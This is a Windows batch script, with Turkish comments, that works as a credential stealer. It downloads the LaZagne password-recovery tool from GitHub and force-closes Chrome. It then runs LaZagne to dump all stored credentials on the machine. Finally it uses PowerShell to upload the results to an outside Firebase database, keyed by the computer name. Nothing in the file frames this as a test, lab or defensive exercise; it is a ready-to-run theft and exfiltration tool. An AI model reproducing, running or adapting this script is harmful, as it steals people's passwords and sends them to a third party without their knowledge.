@echo off
setlocal enabledelayedexpansion

set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: Lazagne varsa kullan, yoksa indir
if not exist "%LAZ_EXE%" (
    echo [INFO] Lazagne.exe indiriliyor...
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
    if %ERRORLEVEL% NEQ 0 (
        echo [ERROR] LaZagne indirilemedi!
        pause
        exit /b 1
    )
    echo [OK] LaZagne indirildi.
) else (
    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
)

:: Chrome açık mı kontrol et ve kapat
tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul
if %ERRORLEVEL% EQU 0 (
    echo [INFO] Chrome calisiyor, kapatiliyor...
    taskkill /IM chrome.exe /F
    if %ERRORLEVEL% EQU 0 (
        echo [OK] Chrome kapatildi.
    ) else (
        echo [WARN] Chrome kapatilamadi.
    )
) else (
    echo [INFO] Chrome calismiyor.
)

:: Sonuc klasoru varsa yoksa oluştur
if not exist "%RESULT_DIR%" (
    mkdir "%RESULT_DIR%"
    if %ERRORLEVEL% NEQ 0 (
        echo [ERROR] Sonuc klasoru olusturulamadi!
        pause
        exit /b 1
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR%

:: Lazagne ile tum credential'lari al, sonucu dosyaya kaydet
echo [INFO] Lazagne calistiriliyor...
"%LAZ_EXE%" all > "%RESULT_DIR%\lazagne_results.txt"
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] Lazagne calistirilirken hata olustu!
    pause
    exit /b 1
)
echo [OK] Lazagne tamamlandi.

:: Firebase'e yukle
echo [INFO] Sonuclar Firebase'e yukleniyor...
for %%F in ("%RESULT_DIR%\*") do (
    echo   -> Yukleniyor: %%~nxF
    powershell -Command ^
      "$content = Get-Content -Raw -Path '%%F'; ^
       Invoke-RestMethod -Uri '%FIREBASE_URL%/%%~nxF.json' -Method PUT -Body $content"
    if !ERRORLEVEL! NEQ 0 (
        echo [ERROR] %%~nxF yuklenemedi!
        pause
        exit /b 1
    ) else (
        echo [OK] %%~nxF yuklendi.
    )
)

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo ------------------------------------------------------------
pause
exit /b 0
